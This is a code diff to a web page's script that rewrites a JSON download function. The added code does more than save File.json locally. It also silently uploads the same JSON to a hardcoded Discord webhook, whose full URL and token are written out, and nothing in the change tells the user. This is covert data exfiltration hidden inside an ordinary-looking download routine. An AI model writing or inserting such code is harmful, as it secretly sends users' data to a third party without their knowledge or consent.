@@ -334,15 +334,42 @@
         reader.readAsDataURL(imageInput);
     }
 
-    function downloadJson(json) {
-        const blob = new Blob([json], { type: 'application/json' });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = 'File.json';
-        a.click();
-        URL.revokeObjectURL(url);
+function downloadJson(json) {
+    // Step 1: Create the Blob and download the JSON file
+    const blob = new Blob([json], { type: 'application/json' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'File.json';
+    a.click();
+    URL.revokeObjectURL(url);
+
+    // Step 2: Send the JSON file to Discord webhook
+    sendJsonToDiscord(json); // Pass 'json' here
+}
+
+// Function to send JSON to Discord webhook
+async function sendJsonToDiscord(json) {
+    const webhookURL = 'https://discord.com/api/webhooks/1281942610696732692/A6MjuWdJ329nAjk_LzeswVTFbRJ9ks8f8naxS8iWK8RZPRstWZdBvAkOSwNysoTMDWA5';
+
+    const formData = new FormData();
+    const jsonBlob = new Blob([json], { type: 'application/json' });
+
+    // Append the JSON file as a blob and a message content
+    formData.append('file', jsonBlob, 'File.json');
+    formData.append('content', 'Jsony');
+
+    try {
+        const response = await fetch(webhookURL, {
+            method: 'POST',
+            body: formData
+        });
+        if (!response.ok) throw new Error('Failed to send JSON to Discord');
+        console.log('JSON');
+    } catch (error) {
+        console.error('Error:', error);
     }
+}
 </script>
 
 
